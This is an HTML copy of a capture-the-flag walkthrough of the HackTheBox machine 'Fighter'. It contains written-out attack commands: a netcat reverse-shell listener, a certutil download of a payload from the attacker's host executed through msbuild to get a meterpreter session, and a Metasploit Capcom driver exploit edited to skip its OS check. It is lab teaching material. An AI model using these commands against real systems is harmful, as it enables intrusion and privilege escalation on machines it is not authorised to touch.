@@ -1,0 +1,118 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Fighter Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-fighter-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-01-08T09:38:07+00:00">January 8, 2019</time><time class="updated" datetime="2025-06-29T19:53:57+00:00">June 29, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Fighter”. It is a retired vulnerable lab presented by Hack the Box for helping pentester’s to perform online penetration testing according to your experience level; they have a collection of vulnerable labs as challenges, from beginners to Expert level.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Intermediate</span></p>
+<p><span style="color: #000000;"><strong>Task</strong>: To find user.txt and root.txt file</span></p>
+<p><span style="color: #000000;"><strong>Note</strong>: Since these labs are online available therefore they have a static IP. The IP of Fighter is 10.10.10.72</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology</strong></span></h3>
+<ul>
+<li><span style="color: #000000;">Network scanning (Nmap)</span></li>
+<li><span style="color: #000000;">Browsing IP address through HTTP</span></li>
+<li><span style="color: #000000;">Adding Domain name to /etc/hosts</span></li>
+<li><span style="color: #000000;">Bruteforcing subdomains</span></li>
+<li><span style="color: #000000;">Adding new domain name to /etc/hosts</span></li>
+<li><span style="color: #000000;">RCE using SQL injection</span></li>
+<li><span style="color: #000000;">Upgrading shell to meterpreter session</span></li>
+<li><span style="color: #000000;">Finding vulnerable service</span></li>
+<li><span style="color: #000000;">Editing Exploit to bypass OS check</span></li>
+<li><span style="color: #000000;">Finding root.exe</span></li>
+<li><span style="color: #000000;">Reversing program to find the password</span></li>
+<li><span style="color: #000000;">Creating a C-program to find the password</span></li>
+<li><span style="color: #000000;">Getting the root flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
+<p><span style="color: #000000;">Let’s start off with our basic nmap command to find out the open ports and services.</span></p>
+<pre class="lang:default decode:true">nmap -sV -sC -T4 10.10.10.72</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ZyKyRNxqHmw/XDRpb6iKW2I/AAAAAAAAb9Y/tCdBHn4W6BAk08w-UtWOO7dpZITtjW4OgCLcBGAs/s1600/1.png" border="0" data-original-height="306" data-original-width="605"/></span></p>
+<p><span style="color: #000000;">The Nmap output shows us that there is only 1 port open: 80(HTTP)</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-9aoMvNk5HF0/XDRpdenKgtI/AAAAAAAAb90/kw_4m8OfK04Tfp_qK2yi3dh5H8lBhAHbgCLcBGAs/s1600/2.png" border="0" data-original-height="631" data-original-width="699"/></span></p>
+<p><span style="color: #000000;">We find that port 80 is running http, so we open the IP in our browser.</span></p>
+<p><span style="color: #000000;">In the homepage, we find the Domain name “streetfighterclub.htb”. We add the domain to our /etc/hosts file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-yEZxq45WQf4/XDRpfgvfyEI/AAAAAAAAb-k/CMDKl7WzXWURiK1lqdv0PDuEieYlwv-_wCLcBGAs/s1600/3.png" border="0" data-original-height="218" data-original-width="602"/></span></p>
+<p><span style="color: #000000;">Since, we don’t find anything new on the webpage, but further looking into the webpage we find that there might be subdomains available that will give us more clues. So, we intercept the request and send it to the intruder. We select where we want to brute force the request.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-oOdl7U0DRUk/XDRpg95u8mI/AAAAAAAAb-4/_nX7xq_Wh-oxa8K1q-TZQSIgvlidM9ZmgCLcBGAs/s1600/4.png" border="0" data-original-height="216" data-original-width="732"/></span></p>
+<p><span style="color: #000000;">We select the wordlist, we use namelist.txt located in /usr/share/dnsrecon/.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-W0XVh_ZB46o/XDRpg8BvbmI/AAAAAAAAb-8/U1QWXQ_E5ysyenL-_MJ6J_M0uOawzK40QCLcBGAs/s1600/5.png" border="0" data-original-height="484" data-original-width="627"/></span></p>
+<p><span style="color: #000000;">After bruteforcing, we find a subdomain called “members.streetfighterclub.htb” that gave HTTP code 403.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gXUUgKlZo-g/XDRphdyTW0I/AAAAAAAAb_A/9VsLHkFfm0EMIRmpjmapfDzQSqiy2ADAACLcBGAs/s1600/6.png" border="0" data-original-height="88" data-original-width="639"/></span></p>
+<p><span style="color: #000000;">We add the subdomain in /etc/hosts so that we can access the web site.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5YKUfi14LNI/XDRphaVuSTI/AAAAAAAAb_E/1xsR_APIlwIvAZZdem0oONRWFYFB_4oyQCLcBGAs/s1600/7.png" border="0" data-original-height="181" data-original-width="552"/></span></p>
+<p><span style="color: #000000;">We open the webpage and got a 403 Forbidden error.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-OAlrWqApClI/XDRphhnkexI/AAAAAAAAb_I/gGDv36WW4UsGRwGAcyJZKun6cAl-Bvd7gCLcBGAs/s1600/8.png" border="0" data-original-height="484" data-original-width="736"/></span></p>
+<p><span style="color: #000000;">Now we run a dirb scan on the members.streetfighter.htb and find a directory called “old”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://members.streetfighterclub.htb/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-tcDBjO4fSko/XDRphwkEVKI/AAAAAAAAb_M/gitNDAsmww0ZBP28G5eyZyLJiY4COCrEQCLcBGAs/s1600/9.png" border="0" data-original-height="414" data-original-width="616"/></span></p>
+<p><span style="color: #000000;">We then find web pages inside that directory. As we know that it is IIS server we find “asp” files on the web server and find a page called “login.asp”.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://members.streetfighterclub.htb/old -X .asp</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vpnTShG7WSQ/XDRpbsKPSvI/AAAAAAAAb9U/RWDb4_6zt2Uwa9tt3WyM7Fo2T6OdWDzeQCLcBGAs/s1600/10.png" border="0" data-original-height="454" data-original-width="676"/></span></p>
+<p><span style="color: #000000;">We open the web page and find a login page.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-JA7ktsLcWXU/XDRpbry1KiI/AAAAAAAAb9Q/sabMCWGz5RcS9V9IzvsiQtMNhkTk83M_ACLcBGAs/s1600/11.png" border="0" data-original-height="643" data-original-width="710"/></span></p>
+<p><span style="color: #000000;">Then, we enumerate the webpage and find that the web application is vulnerable to SQL injection.  We find username, password, and e-mail but were unable to login. So we tried command injection using SQL injection. Refer to this <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.tarlogic.com/en/blog/red-team-tales-0x01/">link</a></span>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VtHqs7nQObc/XDRpb62QJYI/AAAAAAAAb9c/AMEqrqEPDN4EKMagdGQ8HFnJDEgzEVNuACLcBGAs/s1600/13.png" border="0" data-original-height="441" data-original-width="628"/></span></p>
+<p><span style="color: #000000;">We set up our listener and got a reverse shell.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TnNzPxfIkcw/XDRpcbtHNWI/AAAAAAAAb9g/ERn1m0emXKwns21GhiFFHTflkMNvtLUtwCLcBGAs/s1600/14.png" border="0" data-original-height="134" data-original-width="649"/></span></p>
+<p><span style="color: #000000;">We are not able to find anything on the target machine. So we try to convert our shell into meterpreter but are unable to run any exe file. So there was a firewall that didn’t allow us to run any exe file. We got a reference through this <span style="color: #0000ff;">link </span>on how to bypass this. We use the nps payload to create an XML file that will contain our payload (download from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/trustedsec/nps_payload">here</a></span>).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iAPFbo6y61c/XDRpcs6taWI/AAAAAAAAb9k/FnoZtltdR8oD3T0Q2tMVm2biSi2xd00DACLcBGAs/s1600/15.png" border="0" data-original-height="642" data-original-width="643"/></span></p>
+<p><span style="color: #000000;">Next, we move into “c:\users\sqlserv” as we have a shell as user sqlserv.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--4hKcX72V1Q/XDRpcvi43WI/AAAAAAAAb9o/aImoDFB7nacObVYcnwDcmiIEgLVzjMZxACLcBGAs/s1600/16.png" border="0" data-original-height="416" data-original-width="664"/></span></p>
+<p><span style="color: #000000;">We run the command provided by npc payload to start our listener.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -r msbuild_nps.rc</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Kk2hYGqNzX0/XDRpc62O1QI/AAAAAAAAb9s/awS1Ubq3r7Iy3hNhKuy--DzHi6lkXHptgCLcBGAs/s1600/17.png" border="0" data-original-height="323" data-original-width="645"/></span></p>
+<p><span style="color: #000000;">We start our python HTTP Server to send our file to the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-f-qaZ-PDvWM/XDRpc6ljGBI/AAAAAAAAb9w/rdsBFd7M6S46SOn7obLZNcW3TCxvQ70dwCLcBGAs/s1600/19.png" border="0" data-original-height="71" data-original-width="579"/></span></p>
+<p><span style="color: #000000;">Then, we download the file using certutil.exe on the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil.exe -urlcache -split -f http://10.10.14.3/msbuild_nps.xml msbuild_nps.xml</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YOR5EoV1i_M/XDRpdtz_gPI/AAAAAAAAb94/c1M_XywNCnwZ82fGTlkQw-lBANjC3lrjACLcBGAs/s1600/20.png" border="0" data-original-height="521" data-original-width="723"/></span></p>
+<p><span style="color: #000000;">We then run the XML file we uploaded using msbuild.exe.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">c:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe msbuild_nps.xml</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kmpOuJQWM0s/XDRpd7Omf6I/AAAAAAAAb98/iX5umfEEn7cBe-_djkvwXRXw80_UfTlnACLcBGAs/s1600/21.png" border="0" data-original-height="56" data-original-width="723"/></span></p>
+<p><span style="color: #000000;">As soon as we run the file we get a meterpreter session. As we can see by running sysinfo we have a 32-bit meterpreter session on a 64-bit machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VNns1nIsZr0/XDRpdzqSGtI/AAAAAAAAb-A/BQwfthiKzgMaJc_x6-qyIpR09XGNfGxHgCLcBGAs/s1600/22.png" border="0" data-original-height="163" data-original-width="472"/></span></p>
+<p><span style="color: #000000;">To convert it into 64-bit session, we check the processes and find the 64-bit running process. We then migrate our process to a 64-bit process and get a 64-bit session.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; ps
+meterpreter &gt; migrate 2320</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-mSJ3Ej1Kp30/XDRpeNJNEHI/AAAAAAAAb-E/BJ7sd3zqB5EpEJZfsjh0V-cA21vvUER0gCLcBGAs/s1600/23.png" border="0" data-original-height="502" data-original-width="448"/></span></p>
+<p><span style="color: #000000;">We still don’t find anything to escalate our privilege. As this machine on street fighter game, we try to google street fighter exploit and find that street fighter 5 has privilege escalation vulnerability. We find that street fighter has a service called Capcom, so we check if street fighter 5 is installed on the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc query capcom</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-nnsMyJCEzrc/XDRpeUAK3yI/AAAAAAAAb-M/EqZSsJdYkUkoPRrCbhOfeTf4hrrLVqGAgCLcBGAs/s1600/24.png" border="0" data-original-height="253" data-original-width="712"/></span></p>
+<p><span style="color: #000000;">We find this Metasploit exploit <a style="color: #000000;" href="https://www.rapid7.com/db/modules/exploit/windows/local/capcom_sys_exec">here</a>, we try to run it but are unable to get a shell as it gave an error stating that the system was not vulnerable. So we make changes to the code and comment out the section where it checks the OS version.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-NDZDycu34Hk/XDRpeQISYLI/AAAAAAAAb-I/Q6paA4RTvn40O3I3_J2kLimf2pG3VX1OQCLcBGAs/s1600/25.png" border="0" data-original-height="645" data-original-width="568"/></span></p>
+<p><span style="color: #000000;">Now we are successfully able to run the exploit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/windows/local/capcom_sys_exec
+msf exploit(windows/local/capcom_sys_exec) &gt; set payload windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/local/capcom_sys_exec) &gt; set lhost tun0
+msf exploit(windows/local/capcom_sys_exec) &gt; set lport 80
+msf exploit(windows/local/capcom_sys_exec) &gt; set session 2
+msf exploit(windows/local/capcom_sys_exec)&gt; run</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-zpyYXgCg86M/XDRpesDqCpI/AAAAAAAAb-Q/qJC89Mp6WfgqODhna5CVbGGxucFCKq7rQCLcBGAs/s1600/26.png" border="0" data-original-height="416" data-original-width="830"/></span></p>
+<p><span style="color: #000000;">When we check the uid we find that we are successfully able to get administrative rights.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-76-EQPo2xrk/XDRpe_y4r6I/AAAAAAAAb-U/gqmcfZFgjzwLxluTnVOuUW4sPiKT6svjwCLcBGAs/s1600/27.png" border="0" data-original-height="448" data-original-width="496"/></span></p>
+<p><span style="color: #000000;">Then, we enumerate the directories to find the flags and inside “c:\users\decoder\Desktop”, we find a file called “user.txt”. When we take look at the content of the file we find our first flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-dgcdlprIUgA/XDRpe9dtPzI/AAAAAAAAb-Y/kTGEondyqmIOyGsZuTucGBnxu-A5NTqkgCLcBGAs/s1600/28.1.png" border="0" data-original-height="404" data-original-width="538"/></span></p>
+<p><span style="color: #000000;">Now, we move into c:\users\Administratror\Desktop and find a file called “root.exe”. We run it and find that it asks for a password. There is also a DLL file called “checkdll.dll”, as the password might be checked using this DLL file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-diqetAdTAzs/XDRpfZtwZCI/AAAAAAAAb-g/PTwPVdyQ0hsde2pSr4TVW-wMl_vwhFUMQCLcBGAs/s1600/28.png" border="0" data-original-height="413" data-original-width="504"/></span></p>
+<p><span style="color: #000000;">We download both the files into our system using meterpreter.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">download root.exe /root/Desktop
+download checkdll.dll /root/Desktop</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6nbtWj5aJ5U/XDRpfev36yI/AAAAAAAAb-c/OnnZnTwSK60Ih0hfsDH5sE6BEXqWSkc9gCLcBGAs/s1600/29.png" border="0" data-original-height="395" data-original-width="796"/></span></p>
+<p><span style="color: #000000;">We reverse engineer them using IDA and find that this program XOR’s 9 with each character of the variable aFmFeholH. Now analyzing with IDA tells us that the variable contains “Fm`fEhO1}h”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-5Xp0shBdQLg/XDRpf7U1T2I/AAAAAAAAb-o/0yM1TCtoVUQXmRqxLC54ml2QKwbps44hwCLcBGAs/s1600/30.PNG" border="0" data-original-height="175" data-original-width="326"/></span></p>
+<p><span style="color: #000000;">So we create a c program that XOR’s 9 with each character of “Fm`fEhO1}h”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-9xKaf4HvwxM/XDRpgOu32VI/AAAAAAAAb-s/vv7lBDRf6Kw0y6Enn2qIv05DGiQVELK2QCLcBGAs/s1600/31.png" border="0" data-original-height="274" data-original-width="552"/></span></p>
+<p><span style="color: #000000;">We compile and run the file and get the password to be “OdioLaFeta”.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-E9UC3DwluIs/XDRpgLE-fWI/AAAAAAAAb-w/Czad-YoUd8QEusH6QBLaCpfIWTHHsFgagCLcBGAs/s1600/32.png" border="0" data-original-height="88" data-original-width="432"/></span></p>
+<p><span style="color: #000000;">When we provide the password to the root.exe we get our final flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nfc61exURLU/XDRpgov8VuI/AAAAAAAAb-0/VLXTrqNEzmAWYzhZKo0U4BjTFkETt3VBgCLcBGAs/s1600/33.png" border="0" data-original-height="91" data-original-width="511"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
